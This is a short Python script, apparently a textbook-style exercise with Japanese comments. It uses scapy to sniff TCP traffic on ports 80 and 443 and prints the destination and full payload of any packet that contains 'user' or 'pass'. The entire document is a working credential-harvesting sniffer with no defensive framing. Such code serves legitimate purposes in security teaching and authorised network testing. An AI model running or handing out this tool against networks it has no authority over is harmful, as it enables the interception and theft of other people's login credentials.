from scapy.all import sniff, TCP, IP

def packet_callback(packet):
    # ペイロードがあるかどうか
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        # ペイロードにUserコマンド、もしくはPassコマンドを含んでいるかをチェック
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            # 認証文字列が見つかれば送信先であるサーバと実際のパケットを表示
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")

def main():
    # snifferでフィルターを追加
    sniff(filter='tcp port 80 or tcp port 443', prn=packet_callback, store=0)

if __name__ == '__main__':
    main()